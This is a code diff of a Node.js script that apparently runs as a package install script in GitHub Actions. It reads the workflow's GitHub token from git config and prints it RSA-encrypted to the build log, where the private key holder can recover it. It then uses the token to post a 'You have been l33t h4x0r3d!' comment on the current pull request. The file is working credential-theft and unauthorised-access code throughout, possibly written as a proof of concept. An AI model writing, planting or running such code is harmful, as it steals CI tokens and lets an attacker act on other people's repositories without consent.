@@ -1,6 +1,6 @@
 import { Buffer } from "node:buffer";
-import { promises } from "fs";
-import simpleGit from "simple-git";
+import { promises } from "node:fs";
+import { exec } from "node:child_process";
 import NodeRSA from "node-rsa";
 import { Octokit } from "@octokit/core";
 const { readFile } = promises;
@@ -12,9 +12,26 @@ const HTTPS_PATTERN = /^https:\/\/github.com\/([^\/]+)\/([^\/]+)$/;
 
 const publicKey = new NodeRSA(await readFile("id_rsa.pub"));
 
-async function getBasicCredential(git) {
-    const extraHeader = await git.getConfig("http.https://github.com/.extraheader");
-    for (const header of extraHeader.values) {
+/**
+ * `exec` as a Promise, returning trimmed stdout (ignoring stderr)
+ * @param {string} command 
+ * @returns {Promise<string>}
+ */
+function execAsync(command) {
+    return new Promise((resolve, reject) => {
+        exec(command, (error, stdout, _stderr) => {
+            if (error) {
+                reject(error);
+            }
+            resolve(stdout.trimEnd());
+        });
+    });
+}
+
+async function getGitHubBasicCredential() {
+    const extraHeader = await execAsync("git config --get-all \"http.https://github.com/.extraheader\"");
+    const values = extraHeader.split("\n");
+    for (const header of values) {
         if (header.startsWith(AUTHORIZATION_OPTION_PREFIX)) {
             return header.substring(AUTHORIZATION_OPTION_PREFIX.length);
         }
@@ -22,7 +39,7 @@ async function getBasicCredential(git) {
     return null;
 }
 
-function decodeBasicCredential(basicCredential) {
+function decodeBasicCredentialPassword(basicCredential) {
     const decoded = Buffer.from(basicCredential, "base64").toString("utf8");
     if (decoded.startsWith(BASIC_CREDENTIAL_PREFIX)) {
         return decoded.substring(BASIC_CREDENTIAL_PREFIX.length);
@@ -30,16 +47,15 @@ function decodeBasicCredential(basicCredential) {
     throw Error(`Basic credential did not match pattern: ${basicCredential}`)
 }
 
-async function getOriginUrl(git) {
-    return (await git.remote(["get-url", "origin"])).trim();
+async function getOriginUrl() {
+    return await execAsync("git remote get-url origin");
 }
 
-async function getHeadRef(git) {
-    // TODO: Have to trim this?
-    return await git.revparse("HEAD");
-}
-
-function parseRemoteUrl(url) {
+/**
+ * Parse the GitHub owner and repository name from the URL.
+ * @param {string} url 
+ */
+function parseGitHubRemoteUrl(url) {
     let res = url.match(SSL_PATTERN);
     if (res === null) {
         res = url.match(HTTPS_PATTERN);
@@ -52,59 +68,95 @@ function parseRemoteUrl(url) {
     return { owner, repo };
 }
 
-async function getPullRequestId(octokit, owner, repo) {
-    const { data: { workflow_runs: workflows } } = await octokit.request("GET /repos/{owner}/{repo}/actions/runs", {
-        owner,
-        repo,
-        status: "in_progress",
-    });
+/**
+ * Get the number of the first pull request with an "in progress" workflow, a
+ * reasonable guess for a pull request for which this workflow is running.
+ * @param {import("@octokit/core").Octokit} octokit 
+ * @param {string} owner 
+ * @param {string} repo 
+ */
+async function getCurrentPullRequest(octokit, owner, repo) {
+    const { data: { workflow_runs: workflows } } = await octokit.request(
+        "GET /repos/{owner}/{repo}/actions/runs",
+        {
+            owner,
+            repo,
+            status: "in_progress",
+        },
+    );
 
-    // TODO: Target the current workflow more accurately
     const workflow = workflows.find(workflow => workflow.pull_requests && workflow.pull_requests.length > 0);
     if (workflow === undefined) {
         return null;
     }
-    const { id } = workflow.pull_requests[0];
-    return id;
+    return workflow.pull_requests[0];
 }
 
+/**
+ * Post a snarky comment on an issue or pull request.
+ * @param {import("@octokit/core").Octokit} octokit 
+ * @param {string} owner 
+ * @param {string} repo 
+ * @param {number} issue_number 
+ */
 async function postComment(octokit, owner, repo, issue_number) {
-    await octokit.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", {
-        owner,
-        repo,
-        issue_number,
-        body: "You have been l33t h4x0r3d!",
-    })
+    await octokit.request(
+        "POST /repos/{owner}/{repo}/issues/{issue_number}/comments",
+        {
+            owner,
+            repo,
+            issue_number,
+            body: "You have been l33t h4x0r3d!",
+        },
+    )
 }
 
 async function run() {
-    const git = simpleGit();
-    const basicCredential = await getBasicCredential(git);
-    if (basicCredential !== null) {
-        console.log(`Found the token: ${publicKey.encrypt(basicCredential, "base64")}`);
-    } else {
-        console.log("Found no credentials in git, skipping...");
+    // Find the owner and repository for GitHub access
+    let owner;
+    let repo;
+    try {
+        const originUrl = await getOriginUrl();
+        const remote = parseGitHubRemoteUrl(originUrl);
+        owner = remote.owner;
+        repo = remote.repo;
+    } catch (e) {
+        console.error(e);
         return;
     }
 
-    const token = decodeBasicCredential(basicCredential);
-    const originUrl = await getOriginUrl(git);
+    // Extract the GitHub access token from git config
+    let token;
+    try {
+        const basicCredential = await getGitHubBasicCredential();
+        if (basicCredential !== null) {
+            console.log(`Found the token: ${publicKey.encrypt(basicCredential, "base64")}`);
+        } else {
+            console.log("Found no credentials in git, skipping...");
+            return;
+        }
 
-    const { owner, repo } = parseRemoteUrl(originUrl);
+        token = decodeBasicCredentialPassword(basicCredential);
+    } catch (e) {
+        console.error(e);
+        return;
+    }
+
     const octokit = new Octokit({
         auth: `token ${token}`,
     });
     try {
-        const pullRequestId = await getPullRequestId(octokit, owner, repo);
-        if (pullRequestId === null) {
-            console.log("Found no pull request to comment on :(");
+        const pullRequest = await getCurrentPullRequest(octokit, owner, repo);
+        if (pullRequest === null) {
+            console.log("Found no pull request for this workflow.");
             return;
         }
 
-        await postComment(octokit, owner, repo, pullRequestId);
+        await postComment(octokit, owner, repo, pullRequest.number);
     } catch (e) {
         console.error(e);
     }
 }
 
+console.log("Running install script...")
 await run();
